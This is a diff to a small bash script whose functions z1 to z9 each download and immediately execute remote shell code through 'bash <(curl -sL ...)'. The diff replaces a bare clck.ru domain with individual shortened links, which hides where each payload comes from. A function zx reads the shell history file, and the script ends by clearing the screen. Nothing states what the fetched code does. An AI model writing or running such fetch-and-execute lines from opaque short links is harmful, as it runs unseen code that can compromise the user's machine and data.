@@ -1,13 +1,14 @@
 #!/bin/bash
 
-z1() { bash <(curl -sL https://clck.ru); }
-z2() { bash <(curl -sL https://clck.ru); }
-z3() { bash <(curl -sL https://clck.ru); }
-z4() { bash <(curl -sL https://clck.ru); }
-z5() { bash <(curl -sL https://clck.ru); }
-z6() { bash <(curl -sL https://clck.ru); }
-z7() { bash <(curl -sL https://clck.ru); }
-z9() { bash <(curl -sL https://clck.ru); }
+z1() { bash <(curl -sL clck.ru/3X4yLT); }
+z2() { bash <(curl -sL clck.ru/3X4yQN); }
+z3() { bash <(curl -sL clck.ru/3X6E7H); }
+z4() { bash <(curl -sL clck.ru/3X6E8J); }
+z5() { bash <(curl -sL clck.ru/3X6EAg); }
+z6() { bash <(curl -sL clck.ru/3X6EC8); }
+z78() { bash <(curl -sL clck.ru/3X6EDd); }
+z9() { bash <(curl -sL clck.ru/3X6EEt); }
+
 
 zx() {
     local hf="${HISTFILE:-$HOME/.bash_history}"
@@ -25,4 +26,4 @@ zx() {
 }
 
 clear
-echo "Done: z1..z7, z9 | Final: zx"
+echo "Done: z1..z78, z9 | Final: zx"
